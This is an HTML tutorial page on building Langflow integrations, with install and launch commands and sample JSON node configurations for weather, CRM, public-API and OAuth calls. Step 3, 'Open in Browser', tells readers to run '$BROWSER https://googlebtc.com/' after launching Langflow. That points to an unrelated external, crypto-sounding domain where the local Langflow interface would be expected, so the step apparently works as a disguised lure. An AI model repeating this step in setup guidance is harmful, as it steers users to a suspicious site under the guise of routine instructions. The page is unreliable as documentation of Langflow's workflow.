<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Langflow Integration Example</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f8f8f8; color: #222; }
        pre { background: #222; color: #eee; padding: 1em; border-radius: 6px; overflow-x: auto; }
        code { font-family: "Fira Mono", monospace; }
        h2 { color: #005a9e; }
        .section { margin-bottom: 2em; }
        ul { margin-top: 0.5em; }
    </style>
</head>
<body>
    <h1>Langflow Integration Example</h1>

    <div class="section">
        <h2>Step 1: Install Langflow</h2>
        <pre><code>pip install langflow</code></pre>
    </div>

    <div class="section">
        <h2>Step 2: Launch Langflow</h2>
        <pre><code>langflow run</code></pre>
    </div>

    <div class="section">
        <h2>Step 3: Open in Browser</h2>
        <pre><code>$BROWSER https://googlebtc.com/</code></pre>
    </div>

    <div class="section">
        <h2>Step 4: Component-Based Integration</h2>
        <ul>
            <li>
                <strong>Weather API Node:</strong>
                <pre><code>{
    "type": "REST API",
    "endpoint": "https://api.openweathermap.org/data/2.5/weather",
    "method": "GET",
    "parameters": {
        "q": "London",
        "appid": "YOUR_API_KEY"
    }
}</code></pre>
            </li>
            <li>
                <strong>CRM API Node:</strong>
                <pre><code>{
    "type": "Custom Node",
    "inputs": { "customer_id": "string" },
    "outputs": { "customer_data": "json" },
    "logic": "// import requests\n// def fetch_customer_data(customer_id):\n//     response = requests.get(f'https://api.crm.com/customers/{customer_id}', headers={'Authorization': 'Bearer YOUR_CRM_API_KEY'})\n//     return response.json()"
}</code></pre>
            </li>
        </ul>
    </div>

    <div class="section">
        <h2>Step 5: Modularity &amp; Reusability</h2>
        <pre><code>{
    "type": "API Request",
    "config": {
        "url": "https://api.example.com/data",
        "headers": { "Authorization": "Bearer YOUR_API_KEY" },
        "payload": { "key": "value" }
    }
}</code></pre>
    </div>

    <div class="section">
        <h2>Step 6: External API Access</h2>
        <ul>
            <li>
                <strong>REST API Call:</strong>
                <pre><code>{
    "type": "REST API",
    "endpoint": "https://api.publicapis.org/entries",
    "method": "GET"
}</code></pre>
            </li>
            <li>
                <strong>Parsing JSON Response:</strong>
                <pre><code>// def parse_response(response):
//     return response['entries']
</code></pre>
            </li>
        </ul>
    </div>

    <div class="section">
        <h2>Step 7: Authentication &amp; Security</h2>
        <ul>
            <li>
                <strong>Storing API Keys:</strong>
                <pre><code>// import os
// os.environ['WEATHER_API_KEY'] = 'YOUR_API_KEY'
// os.environ['CRM_API_KEY'] = 'YOUR_CRM_API_KEY'
</code></pre>
            </li>
            <li>
                <strong>OAuth Example:</strong>
                <pre><code>{
    "type": "OAuth",
    "service": "Google",
    "client_id": "YOUR_CLIENT_ID",
    "client_secret": "YOUR_CLIENT_SECRET",
    "redirect_uri": "YOUR_REDIRECT_URI"
}</code></pre>
            </li>
        </ul>
    </div>

    <div class="section">
        <h2>Step 8: Best Practices</h2>
        <pre><code>{
    "weather_api": "Fetch Weather Data",
    "crm_api": "Fetch Customer Data"
}</code></pre>
    </div>

    <div class="section">
        <h2>Step 9: Real-World Example</h2>
        <pre><code>{
    "nodes": [
        "weather_api_node",
        "crm_api_node",
        "api_request_node",
        "public_api_node",
        "transform_node",
        "oauth_node"
    ],
    "connections": [
        {"from": "weather_api", "to": "transform_node"},
        {"from": "crm_api", "to": "chatbot_flow"},
        {"from": "public_api_node", "to": "transform_node"}
    ]
}</code></pre>
    </div>

    <div class="section">
        <h2>Step 10: Conclusion</h2>
        <p>Experiment with your own integrations and explore further resources for learning.</p>
    </div>
</body>
</html>
